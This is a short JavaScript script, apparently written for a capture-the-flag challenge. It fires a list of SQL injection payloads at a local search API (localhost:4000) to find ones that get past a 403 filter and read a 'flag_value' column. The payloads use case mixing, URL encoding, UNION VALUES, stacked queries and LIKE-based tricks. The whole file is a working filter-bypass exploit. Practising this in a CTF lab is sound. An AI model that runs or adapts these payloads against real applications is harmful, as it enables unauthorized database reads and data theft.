const bypassSearch = async (payload) => {
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    if (res.status !== 403) {
      console.log(`[SUCCESS] Payload: ${payload} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED] Payload: ${payload}`);
    }
};

const run = async () => {
    // Try obfuscating UNION SELECT
    await bypassSearch("a' UNIoN SeLECT 1, flag_value FROM flags--");
    await bypassSearch("a'%20UNION%20SELECT%201,%20flag_value%20FROM%20flags--");
    await bypassSearch("a' uNiOn sElEcT 1, flag_value FROM flags--");
    
    // Try string concatenation
    await bypassSearch("a' UNION SELECT 1, 'CTF{' || 'sqlguard' || '}--");
    
    // Using VALUES instead of SELECT
    await bypassSearch("a' UNION VALUES(1, (SELECT flag_value FROM flags))--");
    
    // Stacked queries (SQLite allows this in some contexts, but db.all might not)
    await bypassSearch("a'; SELECT flag_value FROM flags--");
    
    // Exploiting LIKE
    await bypassSearch("a%' UNION SELECT 1, flag_value FROM flags--");
};

run();
